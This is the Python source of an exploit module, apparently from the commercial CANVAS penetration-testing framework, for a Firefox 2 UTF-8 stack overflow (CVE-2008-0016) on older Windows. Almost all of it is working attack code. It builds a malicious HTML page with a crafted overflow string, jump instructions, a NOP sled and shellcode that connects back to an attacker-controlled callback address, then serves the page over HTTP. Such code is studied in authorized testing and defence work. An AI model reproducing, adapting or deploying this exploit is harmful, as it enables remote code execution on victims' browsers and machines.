#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path: sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell 
import binascii
import struct

NAME="firefox_utf8"
DESCRIPTION="FireFox UTF8 Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Mozilla"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "09/25/2008"
DOCUMENTATION["CVE Name"] = "CVE-2008-0016"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0016"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Note"] = ""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP","2003" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:firefox_utf8 -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.AcceptAll
        #self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.badstring="" # 
        self.setVersions()
        self.version=0
        self.name=NAME
        self.filename="firefox_utf8.html"
        self.listenerArgsDict["fromcreatethread"]=0
        self.subesp=0x100
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        #                                    POP/POP/RET
        self.versions[1]=("Firefox 2.0.0.16", 0x603589c9)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        #sc=shellcodeGenerator.win32()                                                                                        
        #sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        #sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        #sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        #sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("ExitThread",None)
        #self.shellcode =sc.get()
        
        import MOSDEF.pelib as pelib
        import shellcode.standalone.windows.payloads as payloads
        p = payloads.payloads()
        self.callback.port
        sc = p.forkload(self.callback.ip, self.callback.port, restorehash=True, load_winsock=True)
        self.shellcode = p.assemble(sc)
        return self.shellcode 

    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
        
    def makefile(self, windowsver=0):
        """Makes the actual bad html file to trigger the buffer overflow"""
        if self.version == 0:
            self.version = 1
        (info , addy)  = self.versions[self.version]
        
        self.log("Targeting: %s" % info)
        print addy
        
        if not self.createShellcode():
            return None

        ver = None

        overflow   = "\xe9/AA\xee\xbc\x94\x12\xee\xbd\x84\x12"
        overflow  += "\xee\xbd\x84\x12\xee\xbd\x84\x12\xe8\x85\xa6\xef"
        overflow  += "\xbf\x8a\xe4\x88\x8f\xe6\xa9\x92\xe5\xa0\x82\xe2"
        overflow  += "\xbb\x8d\xd4\xbc\xe7\x91\x9a\xeb\xa3\xaf\xe5\x82"
        overflow  += "\x90\xe5\x82\x90\xef\xaa\x8b\xe7\x96\xaf\xea\xbf"
        overflow  += "\xaa\xee\x9d\xb5\xee\x9f\xbf\xec\xb3\x8c\xec\xb3"
        overflow  += "\x8c\xec\xb3\x8c\xec\xb3\x8c\xec\xb3\x8c\xec\xb3"
        overflow  += "\x8c\xec\xb3\x8c\xec\xb3\x8c"
        overflow  += "AAAAAAAAAAAAAAAAAA"
        overflow  += '\xea\xab\xab'  # \xeb\xac
        overflow  += "A"
        overflow  += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        #overflow  += "AAAAAAAAAAAAAAAAAAAAAAA"
        overflow += '\xe4\x85\x81' * 23
        #overflow  += "\xec\xb3\x8cA"
        #overflow  += '\xe2\xaf\xa9\xef\xbf\xbf\xef\xbf\xbf'
        #overflow  += "AA"
        overflow  += '\xe8\x8b\xab'  # \xeb\x82
        overflow  += "AAAAAA"
        overflow  += "AA"
        overflow  += "AA"
        #overflow  += "DD" # oddly enough, with ID attached there is a offset issue.
        overflow  += "P"
        
        #overflow  += '\xe4\x9f\xa9\xe6\x80\xab' # ret address add esp, 0x1c / ret: 0x602b47e9
        # KIDS, don't do this at home:
        # overflow  += d.encode("utf8")*2
        exec 'd= u"\\u%04x\\u%04x"' % (0x4141, 0x4141) 

        exec 'b= u"\\u%04x\\u%04x"' % (0x06eb, 0x4242)  # JMP 06
        exec 'c= u"\\u%04x\\u%04x\\u%04x"' % (0x87e9, 0xFFF2, 0x43FF) # JMP -0xd79    
            
        overflow  += d.encode("utf8") * 0x321 
        overflow  += b.encode("utf8") * 0x1  # JMP 0x6
        exec 'ar= u"\\u%04x\\u%04x"' % (addy & 0xFFFF, (addy >> 16) & 0xFFFF) 
        overflow  += ar.encode("utf8")         
        overflow  += c.encode("utf8")        # JMP -0xd79 (into search code)
        
        overflow  += d.encode("utf8") * 0x500


        
        
        html = """
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
        <html><body>
        <!CDATA[SHELL]>
                       <a href="\x01xx://xCOCOA" />

               </body></html>
               """.replace("COCOA", overflow).replace("SHELL", "\x90\x50" * 6 + self.shellcode)
        #.replace("SHELL", "B"*500)
        #                <!CDATA[SHELL]>

        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        
        #send the exploit
        self.log("Sending the Firefox utf8 attack html file")
        sploitstring=self.makefile()
        
        if not sploitstring:
            return None,None
        
        b.setBody(sploitstring)

        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
